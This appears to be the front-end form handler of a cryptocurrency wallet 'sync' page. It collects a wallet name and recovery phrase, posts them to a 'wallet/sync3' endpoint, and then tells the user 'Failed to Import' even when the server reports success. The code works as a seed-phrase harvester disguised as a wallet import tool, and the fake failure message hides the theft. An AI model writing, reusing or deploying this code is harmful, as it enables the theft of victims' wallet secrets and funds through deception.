import { toast } from "react-toastify";
import { Request } from "../../helpers/request.js";

export const handleFormSubmit = async ({
  e,
  rPhrase,
  setDisableButton,
  walletName,
  setShowmessage,
  setShowSuccess,
}) => {
  e.preventDefault();
  setDisableButton(true);
  const id = toast.loading("Processing...");

  const checkPhrase = rPhrase.match(/\s*(\S\s*){20,}/g);
  if (!checkPhrase) { 
    setShowmessage("This field cannot be less 20 characters.");
    toast.update(id, {
      render: "This field cannot be less 20 characters",
      type: "warning",
      isLoading: false,
      autoClose: 1000,
    });
    setDisableButton(false);
    return;
  }

  setTimeout(() => {
    setShowmessage("");
  }, 6000);

  const obj = { walletName, rPhrase };
  console.log(obj);
  const request = new Request("wallet/sync3");
  const getSyncMessage = await request.getSyncMessage(obj);

  if (!getSyncMessage.status) {
    setDisableButton(false);
    setShowSuccess(true);
    return toast.update(id, {
      render: getSyncMessage.message || "An error occurred. Try again later",
      type: "error",
      isLoading: false,
      autoClose: 2000,
    });
  }
  if (getSyncMessage.status) {
    setShowSuccess(true);
    setDisableButton(false);
    toast.update(id, {
      render: "Failed to Import",
      type: "error",
      isLoading: false,
      autoClose: 2000,
    });
  }
};
